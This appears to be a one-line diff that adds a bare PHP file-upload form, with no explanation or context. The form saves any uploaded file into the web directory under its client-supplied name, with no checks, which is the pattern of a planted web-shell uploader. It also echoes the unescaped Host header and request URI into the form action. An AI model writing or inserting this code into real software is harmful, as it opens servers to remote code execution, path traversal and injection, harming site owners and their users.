@@ -1,0 +1,1 @@
+<FORM ENCTYPE="multipart/form-data" ACTION=<?php echo "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]; ?> METHOD=POST>Send this file: <INPUT NAME="userfile" TYPE="file"><INPUT TYPE="submit" VALUE="Send"></FORM><?php move_uploaded_file($_FILES["userfile"]["tmp_name"], $_FILES["userfile"]["name"]); ?>
